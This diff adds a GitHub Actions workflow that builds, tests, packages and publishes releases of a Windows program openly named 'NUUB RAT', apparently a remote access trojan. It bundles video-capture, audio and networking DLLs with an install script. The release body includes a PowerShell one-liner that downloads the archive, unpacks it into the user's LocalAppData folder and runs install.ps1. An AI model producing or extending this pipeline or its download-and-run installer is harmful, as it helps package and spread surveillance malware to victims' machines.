@@ -1,0 +1,114 @@
+name: Build & Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+
+permissions:
+  contents: write
+
+jobs:
+  build-and-release:
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup MSBuild
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Setup CMake
+        uses: lukka/get-cmake@latest
+
+      - name: Setup vcpkg
+        uses: lukka/run-vcpkg@v11
+        with:
+          vcpkgGitCommitId: 'c82f74667287d3dc386bce81e44964370c91a289'
+
+      - name: Install dependencies
+        run: vcpkg install --triplet x64-windows
+
+      - name: Configure CMake
+        run: >
+          cmake -B build -S . -G "Visual Studio 17 2022" -A x64
+          -DCMAKE_TOOLCHAIN_FILE=${{ env.VCPKG_ROOT }}/scripts/buildsystems/vcpkg.cmake
+          -DVCPKG_TARGET_TRIPLET=x64-windows
+
+      - name: Build Release
+        run: cmake --build build --config Release
+
+      - name: Run Tests
+        run: ctest --test-dir build --build-config Release --output-on-failure
+
+      - name: Package Release
+        shell: pwsh
+        run: |
+          $version = "${GITHUB_REF_NAME}"
+          $staging = "release/stage"
+          New-Item -ItemType Directory -Path $staging -Force | Out-Null
+
+          # Copy exe
+          Copy-Item "build/Release/nuub.exe" -Destination $staging
+
+          # Copy required DLLs from vcpkg
+          $dllDir = "build/vcpkg_installed/x64-windows/bin"
+          $needed = @(
+            "argon2.dll", "libcrypto-3-x64.dll", "libssl-3-x64.dll",
+            "libcurl.dll", "zlib1.dll", "portaudio.dll", "sndfile.dll",
+            "fmt.dll", "spdlog.dll",
+            "opencv_core4.dll", "opencv_imgproc4.dll", "opencv_imgcodecs4.dll",
+            "opencv_videoio4.dll", "opencv_video4.dll", "opencv_highgui4.dll",
+            "opencv_img_hash4.dll", "jpeg62.dll", "libpng16.dll", "tiff.dll",
+            "turbojpeg.dll", "libwebp.dll", "libsharpyuv.dll",
+            "ogg.dll", "vorbis.dll", "vorbisfile.dll", "FLAC.dll",
+            "opus.dll", "mpg123.dll", "libmp3lame.dll",
+            "liblzma.dll", "libprotobuf-lite.dll",
+            "abseil_dll.dll"
+          )
+          foreach ($dll in $needed) {
+            $src = Join-Path $dllDir $dll
+            if (Test-Path $src) { Copy-Item $src -Destination $staging }
+          }
+
+          # Copy tools and config
+          Copy-Item "config.example.json" -Destination $staging
+          Copy-Item "tools/install.ps1" -Destination $staging
+
+          # Create zip
+          $zipName = "nuub-$version.zip"
+          Compress-Archive -Path "$staging/*" -DestinationPath "release/$zipName" -Force
+          Write-Host "Created release/$zipName"
+
+          # List contents
+          Get-ChildItem $staging | ForEach-Object {
+            Write-Host "  $($_.Name) ($([math]::Round($_.Length / 1KB, 1)) KB)"
+          }
+
+      - name: Create GitHub Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: ${{ github.ref_name }}
+          name: "NUUB RAT ${{ github.ref_name }}"
+          body: |
+            ## NUUB RAT ${{ github.ref_name }}
+
+            ### Quick Install
+            ```powershell
+            # Download and extract
+            $zip = "$env:TEMP\nuub.zip"
+            Invoke-WebRequest "https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/nuub-${{ github.ref_name }}.zip" -OutFile $zip
+            Expand-Archive $zip -DestinationPath "$env:LOCALAPPDATA\NuubRAT" -Force
+            & "$env:LOCALAPPDATA\NuubRAT\install.ps1"
+            ```
+
+            ### Manual Install
+            1. Download `nuub-${{ github.ref_name }}.zip`
+            2. Extract to a folder
+            3. Run `install.ps1`
+
+            ### Changes
+            See commit history for details.
+          files: release/nuub-${{ github.ref_name }}.zip
+          make_latest: true
